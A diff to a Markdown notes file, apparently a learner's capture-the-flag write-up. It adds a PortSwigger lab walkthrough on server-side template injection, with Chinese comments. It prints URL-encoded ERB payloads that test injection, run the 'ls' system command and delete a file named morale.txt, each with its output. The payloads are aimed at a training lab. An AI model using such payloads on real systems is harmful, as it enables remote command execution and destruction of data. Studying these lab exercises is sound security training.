@@ -22,6 +22,19 @@ custom_email={{7*7}}
 3. 
 
 ## Demo
+### Lab1
+https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic <br>
+測試一下，可以發現 message 可以被注入 <br>
+https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=7*7%%3E <br>
+> 49
+之後就開找檔案 <br>
+https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=%20system(%22ls%22)%20%%3E <br>
+> morale.txt true
+之後達成條件：刪除 morale.txt <br>
+https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=%20File.delete("morale.txt")%20%%3E <br>
+> Lab success
+
+
 ### picoCTF SSTI1
 payload
 ```twig
